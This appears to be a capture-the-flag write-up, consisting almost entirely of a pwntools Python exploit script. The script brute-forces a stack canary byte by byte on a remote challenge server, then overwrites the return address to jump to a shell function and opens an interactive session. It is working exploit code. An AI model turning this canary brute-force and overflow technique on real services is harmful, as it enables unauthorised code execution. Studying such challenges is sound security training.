# 8 ^ 256 - pwn


```python
usr/bin/env python3

from pwn import *
from string import printable
import struct

context.binary = './canary'
local = False

canary = []

def get_process():
    if local:
        elf = ELF('./canary')
        return elf.process()
    else:
        return remote('0.cloud.chals.io', 27190)

context.log_level = 'debug'

p = get_process()


# __________________________Brute force stackcookie________________________________________________________________
for cb in range(4):
     currentByte = 0x00

     for i in range(255):
        print("[+] Trying %s (Byte #%d)..." % (hex(currentByte), currentByte + 2))
        DATA = b"B" * 128
        DATA += b"".join([struct.pack(b"B", c) for c in canary])
        DATA += struct.pack(b"B", currentByte)
        p.recvuntil(b"How much data would you like to read?\n")
        p.sendline(str(128 + len(canary) + 1))
        p.recvuntil(b"bytes of data\n")
        p.sendline(DATA)
        result = p.recvuntil(b"I am the forked process!\n")
        print(b"result " +result)
        # print(result)
        if b"and exited successfully" in result:
            canary.append(currentByte)
            print("Right char")
            print("\n[*] Byte #%d is %s\n" % (currentByte + 2, hex(currentByte)))
            currentByte = 0x00
            break
        else:
            print("wrongchar")
            currentByte += 1
            
#Stackcookie found, sending payload   padding + stackcookie + extra padding till offset + getshell() adress
print("canary found!")
print(canary)

payload = b"B" * 128 + b"".join([struct.pack(b"B", c) for c in canary]) + b"B" * 12 + p32(0x0804861b)
p.sendline(str(len(payload)))
p.sendline(payload)
p.interactive()



# __________________________Brute force offset________________________________________________________________
# for i in range(255):
#     p.recvuntil(b"How much data would you like to read?\n")
#     payload = b"B" * 128 + b"".join([struct.pack(b"B", c) for c in canary]) + b"B" * 12 + p32(0x0804861b)
#     p.sendline(str(len(payload)))
#     p.recvuntil(b"bytes of data\n")
#     p.sendline(payload)
#     result = p.recvuntil(b"I am the forked process!\n")
#     print(b"result " +result)


```
